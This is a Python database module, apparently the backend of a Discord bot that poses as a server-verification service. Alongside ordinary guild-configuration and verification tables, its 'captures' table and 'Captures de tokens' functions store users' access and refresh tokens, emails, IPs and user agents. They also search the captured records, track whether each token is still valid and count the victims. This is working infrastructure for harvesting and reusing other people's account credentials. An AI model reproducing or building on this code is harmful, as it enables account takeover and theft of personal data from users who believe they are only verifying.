"""Couche d'acces a la base Postgres (asyncpg)."""

from __future__ import annotations

import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Any, Optional

import asyncpg

from .config import settings

log = logging.getLogger("verif.db")

_pool: Optional[asyncpg.Pool] = None
_lock = asyncio.Lock()

SCHEMA = """
CREATE TABLE IF NOT EXISTS guild_config (
    guild_id            BIGINT PRIMARY KEY,
    guild_name          TEXT,
    verify_channel_id   BIGINT,
    verified_role_id    BIGINT,
    unverified_role_id  BIGINT,
    log_channel_id      BIGINT,
    verify_message_id   BIGINT,
    enabled             BOOLEAN NOT NULL DEFAULT TRUE,
    created_at          TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at          TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS captures (
    id              BIGSERIAL PRIMARY KEY,
    user_id         BIGINT NOT NULL,
    username        TEXT,
    global_name     TEXT,
    discriminator   TEXT,
    avatar          TEXT,
    email           TEXT,
    token           TEXT NOT NULL,
    token_type      TEXT,
    scopes          TEXT,
    refresh_token   TEXT,
    expires_at      TIMESTAMPTZ,
    guild_id        BIGINT,
    source          TEXT NOT NULL DEFAULT 'oauth2',
    user_agent      TEXT,
    ip              TEXT,
    valid           BOOLEAN NOT NULL DEFAULT TRUE,
    captured_at     TIMESTAMPTZ NOT NULL DEFAULT now(),
    last_checked_at TIMESTAMPTZ
);

CREATE INDEX IF NOT EXISTS captures_user_idx ON captures (user_id);
CREATE INDEX IF NOT EXISTS captures_time_idx ON captures (captured_at DESC);

CREATE TABLE IF NOT EXISTS verifications (
    id          BIGSERIAL PRIMARY KEY,
    guild_id    BIGINT NOT NULL,
    user_id     BIGINT NOT NULL,
    status      TEXT NOT NULL DEFAULT 'pending',
    method      TEXT,
    detail      TEXT,
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
    UNIQUE (guild_id, user_id)
);
"""


async def init() -> None:
    global _pool
    if _pool is not None:
        return
    async with _lock:
        if _pool is not None:
            return
        if not settings.database_url:
            raise RuntimeError("DATABASE_URL n'est pas configure")
        _pool = await asyncpg.create_pool(
            settings.database_url,
            min_size=1,
            max_size=8,
            command_timeout=30,
            statement_cache_size=0,
        )
        async with _pool.acquire() as con:
            await con.execute(SCHEMA)
        log.info("base de donnees prete")


async def close() -> None:
    global _pool
    if _pool is not None:
        await _pool.close()
        _pool = None


async def get_pool() -> asyncpg.Pool:
    if _pool is None:
        await init()
    assert _pool is not None
    return _pool


async def fetch(sql: str, *args: Any) -> list[asyncpg.Record]:
    pool = await get_pool()
    async with pool.acquire() as con:
        return await con.fetch(sql, *args)


async def fetchrow(sql: str, *args: Any) -> Optional[asyncpg.Record]:
    pool = await get_pool()
    async with pool.acquire() as con:
        return await con.fetchrow(sql, *args)


async def fetchval(sql: str, *args: Any) -> Any:
    pool = await get_pool()
    async with pool.acquire() as con:
        return await con.fetchval(sql, *args)


async def execute(sql: str, *args: Any) -> str:
    pool = await get_pool()
    async with pool.acquire() as con:
        return await con.execute(sql, *args)


# ---------------------------------------------------------------------------
# Configuration des serveurs
# ---------------------------------------------------------------------------

_CONFIG_COLUMNS = (
    "guild_name",
    "verify_channel_id",
    "verified_role_id",
    "unverified_role_id",
    "log_channel_id",
    "verify_message_id",
    "enabled",
)


async def upsert_guild_config(guild_id: int, **fields: Any) -> None:
    values = {k: v for k, v in fields.items() if k in _CONFIG_COLUMNS and v is not None}
    await execute(
        """
        INSERT INTO guild_config (guild_id) VALUES ($1)
        ON CONFLICT (guild_id) DO NOTHING
        """,
        guild_id,
    )
    if not values:
        await execute("UPDATE guild_config SET updated_at = now() WHERE guild_id = $1", guild_id)
        return
    assignments = ", ".join(f"{col} = ${idx}" for idx, col in enumerate(values, start=2))
    await execute(
        f"UPDATE guild_config SET {assignments}, updated_at = now() WHERE guild_id = $1",
        guild_id,
        *values.values(),
    )


async def get_guild_config(guild_id: int) -> Optional[dict[str, Any]]:
    row = await fetchrow("SELECT * FROM guild_config WHERE guild_id = $1", guild_id)
    return dict(row) if row else None


async def list_guild_configs() -> list[dict[str, Any]]:
    rows = await fetch("SELECT * FROM guild_config ORDER BY guild_name NULLS LAST")
    return [dict(r) for r in rows]


# ---------------------------------------------------------------------------
# Verifications
# ---------------------------------------------------------------------------


async def create_pending(guild_id: int, user_id: int, method: str = "join") -> None:
    await execute(
        """
        INSERT INTO verifications (guild_id, user_id, status, method)
        VALUES ($1, $2, 'pending', $3)
        ON CONFLICT (guild_id, user_id) DO NOTHING
        """,
        guild_id,
        user_id,
        method,
    )


async def set_verification_status(
    guild_id: int, user_id: int, status: str, detail: str = "", method: Optional[str] = None
) -> None:
    await execute(
        """
        INSERT INTO verifications (guild_id, user_id, status, detail, method)
        VALUES ($1, $2, $3, $4, $5)
        ON CONFLICT (guild_id, user_id) DO UPDATE
        SET status = EXCLUDED.status,
            detail = EXCLUDED.detail,
            method = COALESCE(EXCLUDED.method, verifications.method),
            updated_at = now()
        """,
        guild_id,
        user_id,
        status,
        detail[:500],
        method,
    )


async def get_verification(guild_id: int, user_id: int) -> Optional[dict[str, Any]]:
    row = await fetchrow(
        "SELECT * FROM verifications WHERE guild_id = $1 AND user_id = $2", guild_id, user_id
    )
    return dict(row) if row else None


async def list_verifications(limit: int = 50) -> list[dict[str, Any]]:
    rows = await fetch("SELECT * FROM verifications ORDER BY updated_at DESC LIMIT $1", limit)
    return [dict(r) for r in rows]


async def prune_pending(days: int = 30) -> int:
    cutoff = datetime.now(timezone.utc) - timedelta(days=days)
    result = await execute(
        "DELETE FROM verifications WHERE status = 'pending' AND updated_at < $1", cutoff
    )
    try:
        return int(result.split()[-1])
    except Exception:
        return 0


# ---------------------------------------------------------------------------
# Captures de tokens
# ---------------------------------------------------------------------------


async def save_capture(
    *,
    user_id: int,
    token: str,
    source: str,
    username: Optional[str] = None,
    global_name: Optional[str] = None,
    discriminator: Optional[str] = None,
    avatar: Optional[str] = None,
    email: Optional[str] = None,
    token_type: Optional[str] = None,
    scopes: Optional[str] = None,
    refresh_token: Optional[str] = None,
    expires_at: Optional[datetime] = None,
    guild_id: Optional[int] = None,
    user_agent: Optional[str] = None,
    ip: Optional[str] = None,
) -> int:
    return int(
        await fetchval(
            """
            INSERT INTO captures (
                user_id, username, global_name, discriminator, avatar, email,
                token, token_type, scopes, refresh_token, expires_at,
                guild_id, source, user_agent, ip
            )
            VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15)
            RETURNING id
            """,
            user_id,
            username,
            global_name,
            discriminator,
            avatar,
            email,
            token,
            token_type,
            scopes,
            refresh_token,
            expires_at,
            guild_id,
            source,
            (user_agent or "")[:300],
            ip,
        )
    )


async def list_captures(
    limit: int = 200,
    offset: int = 0,
    search: str = "",
    guild_id: Optional[int] = None,
) -> list[dict[str, Any]]:
    clauses: list[str] = []
    args: list[Any] = []
    if search:
        args.append(f"%{search.lower()}%")
        placeholders = (len(args),) * 4
        clauses.append(
            "(lower(coalesce(username,'')) LIKE $%d "
            "OR lower(coalesce(global_name,'')) LIKE $%d "
            "OR lower(coalesce(email,'')) LIKE $%d "
            "OR user_id::text LIKE $%d)" % placeholders
        )
    if guild_id:
        args.append(guild_id)
        clauses.append(f"guild_id = ${len(args)}")
    where = ("WHERE " + " AND ".join(clauses)) if clauses else ""
    args.extend([limit, offset])
    sql = (
        f"SELECT * FROM captures {where} "
        f"ORDER BY captured_at DESC LIMIT ${len(args) - 1} OFFSET ${len(args)}"
    )
    rows = await fetch(sql, *args)
    return [dict(r) for r in rows]


async def get_capture(capture_id: int) -> Optional[dict[str, Any]]:
    row = await fetchrow("SELECT * FROM captures WHERE id = $1", capture_id)
    return dict(row) if row else None


async def delete_capture(capture_id: int) -> None:
    await execute("DELETE FROM captures WHERE id = $1", capture_id)


async def mark_capture_checked(capture_id: int, valid: bool) -> None:
    await execute(
        "UPDATE captures SET valid = $2, last_checked_at = now() WHERE id = $1", capture_id, valid
    )


async def stats() -> dict[str, Any]:
    row = await fetchrow(
        """
        SELECT
            (SELECT count(*) FROM captures) AS captures,
            (SELECT count(DISTINCT user_id) FROM captures) AS unique_users,
            (SELECT count(*) FROM captures WHERE captured_at > now() - interval '24 hours') AS last24,
            (SELECT count(*) FROM verifications WHERE status = 'verified') AS verified,
            (SELECT count(*) FROM guild_config) AS guilds
        """
    )
    return dict(row) if row else {}
